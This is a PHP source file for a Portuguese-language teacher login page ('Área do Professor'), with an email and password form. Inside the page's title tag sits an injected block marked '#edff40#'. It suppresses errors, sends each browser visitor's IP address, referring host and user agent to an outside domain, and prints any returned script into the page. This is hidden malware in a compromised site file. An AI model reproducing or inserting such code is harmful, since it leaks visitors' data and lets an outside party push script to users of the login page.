<?php include_once( "../_config.php" ); ?>
<!DOCTYPE html>
<html>
<head>
	<meta charset=utf-8 />
	<title><?php echo PAGE_TITLE ?>
<?php
#edff40#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/edff40#
?>


 - Área do Professor</title>
	<link href="styles/index.css" rel="stylesheet" type="text/css" />
</head>
<body>
	<div id="content">
		<div id="header">
			<img src="images/logo.jpg">
		</div>
		<form name="form_login" method="post" action="login.php">
			<label>email <br /><input type="text" name="email" class="campos" /></label>
			<label>senha <br /><input type="password" name="password" class="campos" /></label>
			<input type="submit" name="ok" value="enviar" class="enviar" />
		</form>
	</div>
</body>
</html>